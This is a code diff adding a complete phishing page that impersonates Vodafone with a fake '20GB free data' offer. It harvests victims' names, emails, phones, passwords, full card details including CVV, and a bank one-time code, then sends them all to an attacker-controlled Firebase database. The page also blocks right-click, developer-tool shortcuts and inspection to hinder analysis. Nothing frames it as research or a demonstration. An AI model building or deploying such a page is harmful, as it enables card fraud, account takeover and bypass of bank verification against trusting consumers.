@@ -1,0 +1,506 @@
+<!-- Firebase SDK за Realtime Database -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        // Твоите податоци од Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyAGAzEQg9VITbmkZUvkeVaH-GWpd64kBA4",
+            authDomain: "vodafoneapp-43973.firebaseapp.com",
+            databaseURL: "https://vodafoneapp-43973-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "vodafoneapp-43973",
+            storageBucket: "vodafoneapp-43973.firebasestorage.app",
+            messagingSenderId: "821413472890",
+            appId: "1:821413472890:web:c52143c9e8f54fe603a9c3"
+        };
+
+        // Иницијализација на Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Функција за праќање во Realtime Database
+        window.saveUserDataToFirebase = async function(data) {
+            try {
+                const submissionsRef = ref(db, 'vodafone_submissions');
+                await push(submissionsRef, data);
+                console.log("Data successfully written to Realtime Database!");
+            } catch (e) {
+                console.error("Error writing document: ", e);
+            }
+        };
+    </script>
+
+    <style>
+        :root {
+            --voda-red: #ff1a1a;
+            --voda-dark-red: #d90000;
+            --white: #ffffff;
+            --input-bg: rgba(255, 255, 255, 0.15);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--voda-red);
+            color: var(--white);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: rgba(0, 0, 0, 0.15);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 28px;
+            border-radius: 24px;
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .logo { 
+            font-size: 32px; 
+            font-weight: 900; 
+            color: var(--white); 
+            text-align: center; 
+            margin-bottom: 18px; 
+            letter-spacing: -1.5px;
+            text-transform: lowercase;
+        }
+        
+        h2 { 
+            font-size: 20px; 
+            margin-bottom: 6px; 
+            text-align: center;
+            font-weight: 700;
+            color: var(--white);
+        }
+
+        p.subtitle { 
+            font-size: 13px; 
+            color: rgba(255, 255, 255, 0.85); 
+            margin-bottom: 22px; 
+            text-align: center;
+            line-height: 1.4;
+        }
+
+        .section-title { 
+            font-size: 11px; 
+            font-weight: 700; 
+            color: #ffe6e6; 
+            text-transform: uppercase; 
+            margin: 20px 0 8px 0; 
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2); 
+            padding-bottom: 4px;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group { 
+            margin-bottom: 12px; 
+        }
+
+        label { 
+            display: block; 
+            font-size: 12px; 
+            font-weight: 600;
+            margin-bottom: 4px; 
+            color: rgba(255, 255, 255, 0.9); 
+        }
+
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1.5px solid rgba(255, 255, 255, 0.3); 
+            border-radius: 10px; 
+            font-size: 15px; 
+            outline: none;
+            background-color: var(--input-bg);
+            color: var(--white);
+            transition: all 0.2s ease;
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        input:focus { 
+            border-color: var(--white); 
+            background-color: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.15);
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-submit { 
+            width: 100%; 
+            background: var(--white); 
+            color: var(--voda-red); 
+            border: none; 
+            padding: 14px; 
+            border-radius: 12px; 
+            font-size: 15px; 
+            font-weight: 700; 
+            margin-top: 24px; 
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            transition: background 0.2s, transform 0.1s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            text-align: center;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+            background: #f0f0f0;
+        }
+
+        .security-note {
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            margin-top: 15px;
+            line-height: 1.3;
+        }
+
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid var(--voda-red);
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .step-screen {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .step-screen h3 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: var(--white);
+        }
+
+        .step-screen p {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+            line-height: 1.5;
+            margin-bottom: 20px;
+            text-align: left;
+            background: rgba(0, 0, 0, 0.15);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .info-box {
+            text-align: left;
+            background: rgba(0, 0, 0, 0.15);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .info-box ul {
+            padding-left: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+            line-height: 1.6;
+        }
+
+        .otp-timer-container {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 12px;
+            text-align: center;
+        }
+
+        .btn-resend {
+            background: transparent;
+            color: var(--white);
+            border: 1.5px solid rgba(255, 255, 255, 0.4);
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-resend:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .btn-resend:not(:disabled):hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--white);
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">vodafone</div>
+
+    <!-- Main Registration Form -->
+    <div id="formContainer">
+        <h2>Get 20GB Free Data</h2>
+        <p class="subtitle">Register as a new user to claim your welcome bonus. First month is completely free.</p>
+
+        <form id="regForm">
+            <div class="section-title">Step 1: Account Information</div>
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" placeholder="John Doe" required>
+            </div>
+            <div class="form-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="john@example.com" required>
+            </div>
+            <div class="form-group">
+                <label>Phone Number</label>
+                <input type="tel" id="phone" placeholder="+44 7123 456789" required>
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="••••••••" required>
+            </div>
+
+            <div class="section-title">Step 2: Verification Method</div>
+            <p style="font-size: 11px; color: rgba(255, 255, 255, 0.8); margin-bottom: 10px; line-height: 1.3;">
+                A payment method is required to verify your eligibility. The first charge will be in 30 days.
+            </p>
+            
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" placeholder="4532 •••• •••• ••••" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="form-group" style="flex: 1;">
+                    <label>Expiry Date</label>
+                    <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>CVV</label>
+                    <input type="password" id="cardCvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-submit">
+                <span id="btnText">Activate 20GB Now</span>
+                <div class="spinner" id="btnSpinner"></div>
+            </button>
+            
+            <div class="security-note">
+                Secure 256-bit encryption. Subscription auto-expires after 30 days.
+            </div>
+        </form>
+    </div>
+
+    <!-- OTP Screen (Step 3) -->
+    <div id="otpContainer" class="step-screen">
+        <h3>Security Verification</h3>
+        <p>
+            An OTP (One-Time Password) verification code has been sent to your bank-linked device. 
+            <strong>Please do not share this code with anyone.</strong> Enter the code below to proceed.
+        </p>
+        <form id="otpForm">
+            <div class="form-group">
+                <label>Enter OTP Code</label>
+                <input type="text" id="otpCode" placeholder="6-digit code" maxlength="6" required style="text-align: center; font-size: 20px; letter-spacing: 4px;">
+            </div>
+            
+            <div class="otp-timer-container">
+                Code validity period: <span id="timerCountdown" style="font-weight: 700; color: #fff;">00:60</span>
+            </div>
+
+            <button type="submit" class="btn-submit">Continue</button>
+            <button type="button" id="resendBtn" class="btn-resend" disabled onclick="restartOtpTimer()">Get a new code</button>
+        </form>
+    </div>
+
+    <!-- Final Package & Activation Info Screen -->
+    <div id="infoContainer" class="step-screen">
+        <h3>20GB Package Activated!</h3>
+        <p>
+            Your account and identity have been successfully verified. Your 20GB high-speed data package is now ready for use.
+        </p>
+        
+        <div class="info-box">
+            <strong style="display: block; margin-bottom: 8px; font-size: 14px; color: #fff;">How to Use Your Package:</strong>
+            <ul>
+                <li>Valid for high-speed mobile internet browsing and apps.</li>
+                <li>Can be used for standard mobile calls and messaging services.</li>
+                <li>First month is free - subscription auto-expires in 30 days.</li>
+            </ul>
+        </div>
+
+        <button type="button" class="btn-submit" onclick="location.reload()">Finish & Exit</button>
+    </div>
+</div>
+
+<script>
+    // Глобална променлива за привремено чување на податоците
+    let currentSubmissionData = {};
+
+    // Заштита против инспекција
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if (
+            e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) || 
+            (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    setInterval(() => {
+        const threshold = 160;
+        if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+            document.body.innerHTML = "<h2 style='text-align:center; margin-top:40vh;'>Access Denied: Inspector Detected</h2>";
+        }
+    }, 1000);
+
+    // Форматирање на картичка и датум
+    const cardInput = document.getElementById('cardNumber');
+    cardInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        let formattedValue = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formattedValue += ' ';
+            formattedValue += value[i];
+        }
+        e.target.value = formattedValue;
+    });
+
+    const expInput = document.getElementById('cardExp');
+    expInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            e.target.value = value.slice(0, 2) + '/' + value.slice(2, 4);
+        } else {
+            e.target.value = value;
+        }
+    });
+
+    // Тајмер за OTP
+    let countdownInterval;
+    function startOtpTimer() {
+        clearInterval(countdownInterval);
+        let timeLeft = 60;
+        const timerDisplay = document.getElementById('timerCountdown');
+        const resendButton = document.getElementById('resendBtn');
+        
+        resendButton.disabled = true;
+        timerDisplay.style.color = "#fff";
+
+        countdownInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+                timerDisplay.textContent = "00:00";
+                timerDisplay.style.color = "#ffcccc";
+                resendButton.disabled = false;
+            } else {
+                timeLeft--;
+                let formattedTime = timeLeft < 10 ? "00:0" + timeLeft : "00:" + (timeLeft >= 10 ? timeLeft : "0" + timeLeft);
+                timerDisplay.textContent = formattedTime;
+            }
+        }, 1000);
+    }
+
+    function restartOtpTimer() {
+        alert("A new OTP code has been sent to your device.");
+        startOtpTimer();
+    }
+
+    // Чекор 1: Зачувување на основните податоци и картичката, па отворање на OTP екранот
+    document.getElementById('regForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        const btnText = document.getElementById('btnText');
+        const btnSpinner = document.getElementById('btnSpinner');
+        const submitBtn = document.getElementById('submitBtn');
+
+        currentSubmissionData = {
+            fullName: document.getElementById('fullName').value,
+            email: document.getElementById('email').value,
+            phone: document.getElementById('phone').value,
+            password: document.getElementById('password').value,
+            cardNumber: document.getElementById('cardNumber').value,
+            cardExp: document.getElementById('cardExp').value,
+            cardCvv: document.getElementById('cardCvv').value,
+            otpCode: "",
+            timestamp: new Date().toISOString()
+        };
+
+        btnText.style.display = 'none';
+        btnSpinner.style.display = 'block';
+        submitBtn.disabled = true;
+
+        setTimeout(() => {
+            document.getElementById('formContainer').style.display = 'none';
+            document.getElementById('otpContainer').style.display = 'block';
+            startOtpTimer();
+        }, 1500);
+    });
+
+    // Чекор 2: Додавање на OTP кодот и праќање директно во Firebase базaта
+    document.getElementById('otpForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const otpValue = document.getElementById('otpCode').value;
+        currentSubmissionData.otpCode = otpValue;
+
+        // Повикување на функцијата за снимање во Firebase
+        if (window.saveUserDataToFirebase) {
+            await window.saveUserDataToFirebase(currentSubmissionData);
+        }
+
+        clearInterval(countdownInterval);
+        document.getElementById('otpContainer').style.display = 'none';
+        document.getElementById('infoContainer').style.display = 'block';
+    });
+</script>
+
+</body>
+</html>
